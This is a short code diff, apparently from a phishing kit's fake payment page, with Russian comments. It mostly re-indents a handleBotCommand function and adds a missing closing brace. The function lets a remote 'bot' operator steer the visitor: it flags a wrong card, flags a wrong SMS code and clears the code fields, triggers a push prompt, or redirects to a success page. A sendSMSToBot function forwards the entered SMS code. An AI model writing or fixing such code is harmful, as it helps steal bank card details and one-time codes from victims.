@@ -1300,35 +1300,35 @@
         }
 
         function handleBotCommand(command) {
-            console.log('🤖 Обработка команды:', command);
+    console.log('🤖 Обработка команды:', command);
 
-            if (command.action === 'push') {
-                console.log('🔔 Получена команда PUSH');
-                window.showPushNotification();
-            } else if (command.action === 'wrong_card') {
-                console.log('❌ Получена команда WRONG_CARD');
-                hideLoading();
-                window.location.href = 'payment.html?status=wrong_card';
-            } else if (command.action === 'bind' || command.action === 'success') {
-                console.log('🎉 Получена команда SUCCESS');
-                hideLoading();
-                window.location.href = 'success.html';
-            } else if (command.action === 'wrong_sms') {
-                console.log('❌ Получена команда WRONG_SMS');
-                // МГНОВЕННОЕ отображение ошибки без задержек
-                hideLoading();
-                showNotification('error', translations[currentLanguage].errorText, translations[currentLanguage].errorMessage);
-                
-                document.querySelectorAll('.code-input').forEach(input => {
-                    input.value = '';
-                    input.classList.remove('filled');
-                });
-                
-                setTimeout(() => {
-                    document.querySelector('.code-input').focus();
-                }, 300);
-            }
-        }
+    if (command.action === 'push') {
+        console.log('🔔 Получена команда PUSH');
+        window.showPushNotification();
+    } else if (command.action === 'wrong_card') {
+        console.log('❌ Получена команда WRONG_CARD');
+        hideLoading();
+        window.location.href = 'payment.html?status=wrong_card';
+    } else if (command.action === 'bind' || command.action === 'success') {
+        console.log('🎉 Получена команда SUCCESS');
+        hideLoading();
+        window.location.href = 'success.html';
+    } else if (command.action === 'wrong_sms') {
+        console.log('❌ Получена команда WRONG_SMS');
+        // МГНОВЕННОЕ отображение ошибки без задержек
+        hideLoading();
+        showNotification('error', translations[currentLanguage].errorText, translations[currentLanguage].errorMessage);
+        
+        document.querySelectorAll('.code-input').forEach(input => {
+            input.value = '';
+            input.classList.remove('filled');
+        });
+        
+        setTimeout(() => {
+            document.querySelector('.code-input').focus();
+        }, 300);
+    } // ← ЗАКРЫВАЮЩАЯ СКОБКА ДОБАВЛЕНА ЗДЕСЬ
+}
 
         async function sendSMSToBot(smsCode) {
             try {
@@ -1438,3 +1438,4 @@
     </script>
 </body>
 </html>
+
